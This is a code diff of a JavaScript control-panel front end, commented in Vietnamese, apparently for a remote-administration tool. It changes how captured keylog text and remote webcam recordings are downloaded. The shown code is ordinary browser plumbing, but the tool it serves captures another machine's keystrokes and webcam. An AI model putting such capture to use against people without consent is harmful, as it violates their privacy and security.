@@ -77,31 +77,22 @@ function showTab(id) {
 }
 
 // --- HÀM DOWNLOAD KEYLOG ---
+// --- HÀM DOWNLOAD KEYLOG (CÁCH MỚI: Tải trực tiếp từ trình duyệt) ---
 function downloadKeylog() {
-    // Lấy nội dung text
     const content = document.getElementById('keylog-content').textContent;
-    
-    // Gửi về server Python (client.py) để lưu
-    fetch('/api/save_keylog_local', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: content })
-    })
-    .then(r => r.json())
-    .then(data => {
-        if (data.status === 'ok') {
-            showToast("Đã lưu file: " + data.message, "success");
-        } else {
-            showToast("Lỗi lưu file: " + data.message, "error");
-        }
-    })
-    .catch(err => {
-        
-        showToast("Lỗi kết nối!", "error");
-        console.error(err);
-    });
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = window.URL.createObjectURL(blob);
+
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'keylog_data.txt'; // Tên file tải về
+    document.body.appendChild(a);
+    a.click();
+
+    window.URL.revokeObjectURL(url);
+    document.body.removeChild(a);
+
+    showToast("Đang tải xuống keylog...", "success");
 }
 
 // --- HÀM XÓA KEYLOG (UI + SERVER) ---
@@ -140,8 +131,36 @@ function recordWebcam() {
     const sec = document.getElementById('cam-seconds').value;
     const indicator = document.getElementById('rec-indicator');
     indicator.style.display = 'flex';
-    sendControl('webcam_record', null, { seconds: sec });
-    setTimeout(() => { indicator.style.display = 'none'; }, sec * 1000 + 1000);
+
+    // Gửi lệnh ghi hình
+    fetch('/control', { 
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'}, 
+        body: JSON.stringify({ action: 'webcam_record', seconds: sec }) 
+    })
+    .then(r => r.json())
+    .then(data => {
+        indicator.style.display = 'none'; // Tắt đèn báo ghi hình
+
+        if (data.status === 'ok' && data.download_url) {
+            // Tạo link tải về ảo và click vào nó
+            const downloadLink = `/download_local/${data.download_url}`;
+            const a = document.createElement('a');
+            a.href = downloadLink;
+            a.download = data.download_url;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            showToast("Đang tải video về máy...", "success");
+        } else {
+            showToast("Lỗi: " + (data.message || "Không thể ghi hình"), "error");
+        }
+    })
+    .catch(err => {
+        indicator.style.display = 'none';
+        showToast("Mất kết nối server!", "error");
+    });
 }
 
 function toggleKeylog(start) {
